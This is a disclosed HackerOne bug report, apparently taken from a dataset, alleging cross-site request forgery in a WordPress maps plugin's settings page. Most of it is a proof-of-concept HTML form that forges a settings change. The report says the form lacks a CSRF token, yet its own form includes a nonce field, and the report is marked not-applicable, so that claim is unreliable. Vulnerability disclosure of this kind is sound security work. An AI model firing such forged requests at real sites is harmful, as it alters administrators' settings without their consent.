---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '153580'
original_report_id: '153580'
title: CSRF in changing settings of Basic Google Maps Placemarks
weakness: Cross-Site Request Forgery (CSRF)
team_handle: iandunn-projects
created_at: '2016-07-24T20:32:24.114Z'
disclosed_at: '2016-07-25T14:27:17.426Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 4
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in changing settings of Basic Google Maps Placemarks

## Metadata

- HackerOne Report ID: 153580
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: iandunn-projects
- Disclosed At: 2016-07-25T14:27:17.426Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Hey, this is Ahsan Tahir! 

I was just pentesting Basic Google Maps Placemarks in Wordpress, I found a CSRF (Cross-Site Request Forgery) So, by exploiting this CSRF issue, an attacker can edit the settings (e.g Map Width, Map Height, Map Center Address etc..) 

#PoC 
There is not CSRF token/Authentication token when changing settings of Basic Google Maps Placemarks (http://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings)

So, we can exploit it with the following code:

##Exploit Code
```
<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/options.php" method="POST">
      <input type="hidden" name="option&#95;page" value="bgmp&#95;settings" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="&#95;wpnonce" value="a9ef057ff9" />
      <input type="hidden" name="&#95;wp&#95;http&#95;referer" value="&#47;wordpress&#47;wp&#45;admin&#47;options&#45;general&#46;php&#63;page&#61;bgmp&#95;settings" />
      <input type="hidden" name="bgmp&#95;map&#45;width" value="testing" />
      <input type="hidden" name="bgmp&#95;map&#45;height" value="testing" />
      <input type="hidden" name="bgmp&#95;map&#45;address" value="testing" />
      <input type="hidden" name="bgmp&#95;map&#45;zoom" value="7" />
      <input type="hidden" name="bgmp&#95;map&#45;type" value="ROADMAP" />
      <input type="hidden" name="bgmp&#95;map&#45;type&#45;control" value="off" />
      <input type="hidden" name="bgmp&#95;map&#45;navigation&#45;control" value="DEFAULT" />
      <input type="hidden" name="bgmp&#95;map&#45;info&#45;window&#45;width" value="testing" />
      <input type="hidden" name="bgmp&#95;cluster&#45;max&#45;zoom" value="testing" />
      <input type="hidden" name="bgmp&#95;cluster&#45;grid&#45;size" value="testing" />
      <input type="hidden" name="bgmp&#95;cluster&#45;style" value="default" />
      <input type="hidden" name="submit" value="Save&#32;Changes" />
      <input type="hidden" name="closedpostboxesnonce" value="faa425ff22" />
      <input type="hidden" name="&#95;wp&#95;http&#95;referer" value="&#47;wordpress&#47;wp&#45;admin&#47;options&#45;general&#46;php&#63;page&#61;bgmp&#95;settings" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

If you run above HTML code in your browser, when you are logged in to your wordpress, and click on submit request, *every* value of http://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings will be set to "testing" 

This one is a small, but effective CSRF; effective because if anyone tricks the admin into clicking the button, or even visiting the page (JavaScript is used in that type of exploit code!) The settings will be changed automatically!

###How to Fix?
The fix is simple, add a CSRF token in the request/form for editing the settings of Basic Google Maps Placemarks! 

Hoping for your positive response! ✌

If you have any other questions or if anything needs clarification, please let me know.

Cheers,
Ahsan

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
